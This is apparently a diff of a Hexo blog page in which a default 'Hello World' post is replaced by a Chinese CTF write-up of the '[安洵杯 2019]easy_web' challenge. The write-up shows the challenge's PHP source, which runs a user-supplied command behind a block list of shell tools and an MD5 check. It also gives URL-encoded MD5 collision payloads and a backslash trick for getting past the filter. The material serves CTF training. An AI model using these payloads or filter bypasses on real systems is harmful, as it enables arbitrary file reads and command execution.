@@ -9,8 +9,6 @@
     
     <title>
         
-            Hello World |
-        
         n3ym4r&#39;s blog
     </title>
     
@@ -173,7 +171,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">Hello World</span>
+            <span class="title-hover-animation"></span>
         </div>
 
         
@@ -193,13 +191,13 @@
         
             <i class="fa-regular fa-calendar-plus"></i>&nbsp;
         
-        <span class="pc">2022-10-15 22:14:09</span>
-        <span class="mobile">2022-10-15 22:14</span>
+        <span class="pc">2023-01-16 13:21:24</span>
+        <span class="mobile">2023-01-16 13:21</span>
     </span>
     
         <span class="article-update-date article-meta-item">
         <i class="fas fa-file-pen"></i>&nbsp;
-        <span class="pc">2022-10-15 22:14:09</span>
+        <span class="pc">2023-01-16 13:24:47</span>
     </span>
     
     
@@ -208,12 +206,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>75 字</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>803 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>4 分钟</span>
         </span>
     
     
@@ -225,19 +223,71 @@
         
 
         <div class="article-content markdown-body">
-            <p>Welcome to <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
+            <pre><code>title: [安洵杯 2019]easy_web
+date: 2023-01-16 13:22:14
+tags: [Web安全] 
+categories: [打靶]
+sticky: 0
 </code></pre>
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
+<p>打开页面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673841793093-8f0da070-0efa-46ce-9f5f-5e51e448622f.png#averageHue=%23080808&clientId=u111a1b03-09ba-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=536&id=udae53fa3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=837&originWidth=1834&originalType=binary&ratio=1&rotation=0&showTitle=false&size=282733&status=done&style=none&taskId=uf5b4d1ba-89b4-460b-b0ae-f13c8af2a02&title=&width=1173.76" alt="image.png"><br>我们可以看到传了两个参数img和cmd，img值拿去尝试解密,经过两次base64解码得到一串16进制码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673842224161-3b05f1ae-9d72-4972-b04c-bba475d623ea.png#averageHue=%23fdfdfd&clientId=u111a1b03-09ba-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=170&id=u6673073a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=266&originWidth=1285&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34253&status=done&style=none&taskId=u8e861136-ef21-4538-9946-2847c54f4be&title=&width=822.4" alt="image.png"><br>再进行ascillhex解码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673842297164-2a57860b-e861-460b-a832-aaaf5e3507fa.png#averageHue=%23212427&clientId=u111a1b03-09ba-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=162&id=ucdba6c87&margin=%5Bobject%20Object%5D&name=image.png&originHeight=253&originWidth=357&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6086&status=done&style=none&taskId=uae5a2a55-d62e-455f-9227-f4272bbcecc&title=&width=228.48" alt="image.png"><br>得到文件名555.php<br>这时候，我们就能知道后端会将文件名经过base64编码后发到前端进行处理，那么我们可以逆过程，推出其他文件的编码名，在前端回显。<br>读index.php<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673842545098-d6b87167-baa5-446d-9101-bb7e5d914d17.png#averageHue=%23222528&clientId=u111a1b03-09ba-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=156&id=ubbaac89c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=253&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6456&status=done&style=none&taskId=u2e83dae0-9226-4cf4-a4be-045ee8e461f&title=&width=161.92" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673842672622-f057164b-5891-4593-92dd-0d440198884c.png#averageHue=%23fdfdfc&clientId=u111a1b03-09ba-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=107&id=ub22ec121&margin=%5Bobject%20Object%5D&name=image.png&originHeight=167&originWidth=1374&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27741&status=done&style=none&taskId=u9166c998-9238-49aa-846f-3dd3aebca96&title=&width=879.36" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673842689366-1e5272d6-2602-417c-ad9b-f8cb8dd688f1.png#averageHue=%23fdfcfc&clientId=u111a1b03-09ba-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=106&id=ue35f6d39&margin=%5Bobject%20Object%5D&name=image.png&originHeight=166&originWidth=1354&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28739&status=done&style=none&taskId=u6ad1ade0-3570-4bb4-97a8-a43876f06c5&title=&width=866.56" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673842794965-8fd3e22c-14f1-4f81-9699-7c02971b98d0.png#averageHue=%23282626&clientId=u111a1b03-09ba-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=435&id=ude6cfc09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=679&originWidth=1553&originalType=binary&ratio=1&rotation=0&showTitle=false&size=188664&status=done&style=none&taskId=ud1acd0ec-f6bc-488d-a33d-41e98044c51&title=&width=993.92" alt="image.png"><br>回显编码之后的index.php<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673842932871-3f3a3fde-d917-4861-a380-1f46a418b6ae.png#averageHue=%23f7f4f2&clientId=u111a1b03-09ba-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=460&id=u1f3e273e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=719&originWidth=1568&originalType=binary&ratio=1&rotation=0&showTitle=false&size=360384&status=done&style=none&taskId=ua5f19aac-803a-484e-b5a5-e51d4e4678b&title=&width=1003.52" alt="image.png"><br>解码得到index源码<br>进行代码审计</p>
+<pre><code class="go">&lt;?php
+error_reporting(E_ALL || ~ E_NOTICE);
+header(&#39;content-type:text/html;charset=utf-8&#39;);
+$cmd = $_GET[&#39;cmd&#39;];
+if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
+    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
+//解码得出真实文件名
+$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));
+//将文件名中的一些特殊符号替换为空
+$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);
+//不能直接读flag文件
+if (preg_match(&quot;/flag/i&quot;, $file)) &#123;
+    echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;
+    die(&quot;xixiï½ no flag&quot;);
+&#125; else &#123;
+    //将文件base64编码后传到前端
+    $txt = base64_encode(file_get_contents($file));
+    echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;
+    echo &quot;&lt;br&gt;&quot;;
+&#125;
+echo $cmd;
+echo &quot;&lt;br&gt;&quot;;
+//禁用的函数或特殊符号列表
+if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;
+    echo(&quot;forbid ~&quot;);
+    echo &quot;&lt;br&gt;&quot;;
+&#125; else &#123;
+    //md5强碰撞
+    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;
+        //反引号，可以执行该命令
+        echo `$cmd`;
+    &#125; else &#123;
+        echo (&quot;md5 is funny ~&quot;);
+    &#125;
+&#125;
+
+?&gt;
+&lt;html&gt;
+&lt;style&gt;
+  body&#123;
+   background:url(./bj.png)  no-repeat center center;
+   background-size:cover;
+   background-attachment:fixed;
+   background-color:#CCCCCC;
+&#125;
+&lt;/style&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 </code></pre>
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
+<p>可以知道，主要就是看两个post传参a和b,和cmd参数<br>这里cmd过滤了几乎所有的查看文件的命令，事实上是可以绕过的。<br>用反斜杠绕过<br>在Linux中，反引号对一些命令也几乎没有影响，测试如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673844786545-54af4bc3-e382-4e9f-a503-9732c68f0302.png#averageHue=%23242b37&clientId=ua2ee4f5c-8c9d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=192&id=u2588a758&margin=%5Bobject%20Object%5D&name=image.png&originHeight=300&originWidth=912&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121882&status=done&style=none&taskId=u1a642067-ba12-430c-a621-dc51f341070&title=&width=583.68" alt="image.png"><br>然后就是后面的MD5强碰撞<br>这里有两个版本</p>
+<pre><code class="go">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
+&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+
+a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
 </code></pre>
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
-</code></pre>
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
+<p>然后直接传参<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673845996659-270b9a2b-0d50-48ae-a34f-eb14de599f5f.png#averageHue=%23312e2e&clientId=ua2ee4f5c-8c9d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=319&id=uf259bd3e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=498&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95755&status=done&style=none&taskId=u398e4d14-bc23-4f87-8e37-5772127661f&title=&width=762.88" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32497516/1673846055534-aa3b6aa6-efa2-4ccc-8e93-fb37a8fe4aa5.png#averageHue=%23302f2e&clientId=ua2ee4f5c-8c9d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=278&id=u860cbab8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=435&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91923&status=done&style=none&taskId=u037e4d6b-ca32-4662-a126-304de550fbf&title=&width=755.84" alt="image.png"><br>得到flag</p>
 
         </div>
 
@@ -245,11 +295,11 @@
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul class="copyright-info-content">
-        <li>本文标题：Hello World</li>
+        <li>本文标题：</li>
         <li>本文作者：n3ym4r</li>
-        <li>创建时间：2022-10-15 22:14:09</li>
+        <li>创建时间：2023-01-16 13:21:24</li>
         <li>
-            本文链接：https://n3ym4r.github.io/2022/10/15/hello-world/
+            本文链接：https://n3ym4r.github.io/2023/01/16/[安洵杯 2019]easy_web/
         </li>
         <li>
             版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -265,29 +315,14 @@
         
             <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2023/01/16/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_web/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item"></span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2020/04/07/sql%E6%B3%A8%E5%85%A5/"
+                           href="/2022/10/15/hello-world/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">SQL注入学习笔记</span>
+                                <span class="post-nav-title-item">Hello World</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -405,7 +440,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        
     </div>
 </div>
         </aside>
